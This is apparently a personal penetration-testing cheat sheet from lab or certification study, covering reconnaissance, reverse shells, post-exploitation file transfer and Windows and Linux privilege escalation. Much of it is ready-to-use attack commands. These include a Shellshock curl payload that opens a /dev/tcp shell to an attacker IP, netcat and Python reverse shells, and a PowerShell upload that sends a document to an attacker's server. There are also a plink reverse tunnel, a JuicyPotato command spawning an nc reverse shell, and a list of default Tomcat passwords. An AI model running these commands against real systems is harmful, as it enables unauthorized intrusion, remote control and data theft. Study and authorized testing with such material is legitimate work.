<!-- TABLE OF CONTENTS -->
<details open="open">
  <summary>Table of Contents</summary>
   <ol>
        <li><a href="#recon">Recon</a></li>
        <li><a href="#reverse-shell">Reverse Shell</a></li>
        <li><a href="#after-first-shell">After first shell</a></li>
        <li><a href="#general">General</a></li>
        <li><a href="#privilege-escalation">Privilege escalation</a></li>
        <li><a href="#references">References</a></li>
   </ol>
</details>





## Recon

* Port Scan (basics):

   ```
   nmap -sC -sV -Pn -n -T4 -oN file.nmap <TARGET> -vvv
   ```
   ```
   nmap -sC -sV -Pn -n -T4 -p- -oN file.nmap <TARGET> -vvv
   ```
   ```
   sudo nmap -sC -sV -sU -n -T4 -p- -oN file.nmap <TARGET> -vvv
   ```

* List SMB shares:

   ```
   nmap --script=smb-enum-shares -p 135,139,445 -sV <TARGET>
   ```
   * Output example:
        ```
        Host script results:
        | smb-enum-shares: 
        |   account_used: guest
        |   \\<IP>\ADMIN$: 
        |     Type: STYPE_DISKTREE_HIDDEN
        |     Comment: Remote Admin
        |     Anonymous access: <none>
        |     Current user access: <none>
        |   \\<IP>\C$: 
        |     Type: STYPE_DISKTREE_HIDDEN
        |     Comment: Default share
        |     Anonymous access: <none>
        |     Current user access: <none>
        |   \\<IP>\IPC$: 
        |     Type: STYPE_IPC_HIDDEN
        |     Comment: Remote IPC
        |     Anonymous access: <none>
        |     Current user access: READ/WRITE
        |   \\<IP>\wwwroot: 
        |     Type: STYPE_DISKTREE
        |     Comment: 
        |     Anonymous access: <none>
        |_    Current user access: READ
        ```
    * In case you find something (example):
    
        ```
        sudo mount -t cifs //<IP>/wwwroot <FOLDER_IN_MY_MACHINE> -o user=guest
        ```

* List nmap script (search example):

   ``` 
   nmap --script-help "*ms* and *sql*"
   ```

* Nikto:

   ```
   nikto -h http(s)://<ADDRESS>:PORT -o file.nikto
   ```

* Dir brute force:

   * dirb:

        ```
        dirb <http://IP:PORT> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -o <OUTPUT FILE>
        ```

   * gobuster:

        ```
        /opt/gobuster-linux-amd64/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url <http://IP:PORT> -o <OUTPUT FILE>
        ```

   * Always remember dirbuster ;)

* Ident (just in case) example:

    ```
    ident-user-enum <TARGET> 22 113 139 445
    ```

* Curl

    * To access restricted files in some cases:

        ```
        curl -iv -A "Googlebot/2.1 (+http://www.googlebot.com/bot.html)" http://10.11.1.39/robots.txt)" http://<IP>/<RESTRICTED_FILE>
        ```
    
    * Shellshock simple (remember to configure listenner):

        ```
        curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTIM/cgi-bin/admin.cgi
        ```
        
        
        
        
## Reverse Shell

* Netcat OpenBSD (and also some Linux)

    ```
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
    ```
* Python:

    ```
    export RHOST="<ATTACKER_IP>";export RPORT=<PORT>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    ```

* Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md





## After first shell

* Getting TTY (almost always work on Linux):

    ```
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```

* Powershell:

    * Download files:

        ```
        powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://IP:PORT/nc.exe','C:\Full\path\nc.exe')
        ```

        or

        ```
        (New-Object Net.WebClient).DownloadFile('http://IP:PORT/nc.exe','C:\Full\path\nc.exe')
        ```

    * Upload files:

        Page 486-487. **You prepared the environment already**:
    
        ```
        powershell (New-Object System.Net.WebClient).UploadFile('http://<ATTACKER_IP>/upload.php', 'important.docx')
        ```

* Simple HTTP Server to dowload scripts and tools to the victim (example):

    ```
    python3.8 -m http.server 8081
    ```


* SSH Tunnel on Windows (need to upload plink to the victim):

    **Useful when some service is running only on localhost or is blocked by some firewall.**

    * Always download the last version:

        https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
    
    
    * Command:
        ```
        cmd.exe /c echo y | plink.exe -ssh -l [ATTACKER_USER] -pw [ATTACKER_PASSWORD] -R [ATTACKER_IP]:[ATTACKER_PORT]:127.0.0.1:[VICTIM_LOCAL_OPEN_PORT] [ATTACKER_IP]
        ```

        Example:
        ```
        cmd.exe /c echo y | plink.exe -ssh 10.10.14.16 -P 22022 -l attacker_username -pw RandomPassword123 -R 10.10.14.16:1234:127.0.0.1:8888
        ```




## General

* Generate a wordlist based on specific page:

    ```
    cewl -d2 -m 5 -w wordlist.txt http://<IP>:<PORT>/php/index.php
    ```

* Login to RDP Windows:

    ```
    rdesktop -g 1440x900 -u <USER> -p <PASSWORD> <IP>
    ```

* Ethernal blue:

    * Manual exploit: **See machine PUBLIC .75**

    * Very useful link: https://redteamzone.com/EternalBlue/


* Apache Tomcat (default passwords):

    |Username     |Password  |
    |-------------|----------|
    |admin        |password  |
    |admin        |<blank>   |
    |admin        |Password1 |
    |admin        |password1 |
    |admin        |admin     |
    |admin        |tomcat    |
    |both         |tomcat    |
    |manager      |manager   |
    |role1        |role1     |
    |role1        |tomcat    |
    |role         |changethis|
    |root         |Password1 |
    |root         |changethis|
    |root         |password  |
    |root         |password1 |
    |root         |r00t      |
    |root         |root      |
    |root         |toor      |
    |tomcat       |tomcat    |
    |tomcat       |s3cret    |
    |tomcat       |password1 |
    |tomcat       |password  |
    |tomcat       |<blank>   |
    |tomcat       |admin     |
    |tomcat       |changethis|


* Unshadow:

    Unshadow merge passwd with shadow files, organizing both in one file:

    ```
    /usr/sbin/unshadow passwd_file.txt shadow_file.txt > <OUT_FILE>
    ```






## Privilege escalation

### Windows

* User information:
    ```
    net user <USERNAME>
    ```
    and
    ```
    whoami /priv
    ```
* Stored credentials:
    ```
    cmdkey /list
    ```

* List hidden files:
    ```
    dir /a
    ```

* Winpeas (be careful, this tool can be forbidden):

    https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

* Juicy potato:

    0. Checking if you can use on cmd:

        ```
        whoami /priv
        ```
        or
        ```
        whoami /all
        ```
        or, if you decide to use meterpreter:
        ```
        meterpreter > getprivs
        ```


        If the output contains **SeImpersonatePrivilege** and **SeAssignPrimaryToken**, probably you can use this method!

    1. How to use: http://ohpe.it/juicy-potato/
    2. List of CLSIDs: http://ohpe.it/juicy-potato/CLSID/
    3. Executables:
        * x86: https://github.com/ivanitlearning/Juicy-Potato-x86/releases (also see folder of machine **Public 73**)
        * x64: https://github.com/ohpe/juicy-potato/releases/tag/v0.1 (oficial github)
    4. More tips: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
    5. Machines that helps: **disco (Public 13)** and **Public 73**. I used metasploit on disco machine, see the report.
    6. How to find CLSID: http://ohpe.it/juicy-potato/Test/ (I did not try this script yet)
    7. After upload the correct executable to target and find the correct CLSID:

        * **This command close a reverse shell to your machine (you need configure a listenner on your machine and upload nc.exe to the victim):**

        ```
        juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\folde\with\nc\nc.exe <ATTACKER_IP> 4444 -e cmd.exe" -t * -c {clsid}
        ```




### Linux

* Simple sudo without password:
    ```
    sudo su -
    ```

* List allowed sudo commands:
    ```
    sudo -l
    ```

* Crontab (see more tips ):
    ```
    crontab -l
    ```

* Another commands see: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

* LinEnum:
    * https://github.com/rebootuser/LinEnum

* Privesc using `cp` command:
    * https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/

* Privesc using SUID binaries:
    * https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/


### References

* Payload all the things: https://github.com/swisskyrepo/PayloadsAllTheThings
* GTFOBins: https://gtfobins.github.io/gtfobins/nmap/
* Windows XP SP1 privesc: https://sohvaxus.github.io/content/winxp-sp1-privesc.html
* SMB Share Enum: https://blog.codecentric.de/en/2017/11/penetration-test-training-lazysysadmin-1-vanilla-style/
* SQL Server attack tips: https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
* ColdFusion attack: https://chennylmf.medium.com/hackthebox-walkthrough-arctic-e0ae709fc121
* Ethernal Blue: https://redteamzone.com/EternalBlue/
* Webmin: https://netosec.com/pwnos-vulnhub-walkthrough/
* https://dominicbreuker.com/post/htb_dropzone/ (see Public 111)
* SQLi Payloads:
    * Commands to test: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
    * MS SQL Client on Kali: https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell/
    * How to use xp_cmdshell: https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/
* Exploit-db bin sploits: https://github.com/offensive-security/exploitdb-bin-sploits
* Privesc Hacking Articles: https://www.hackingarticles.in/category/privilege-escalation/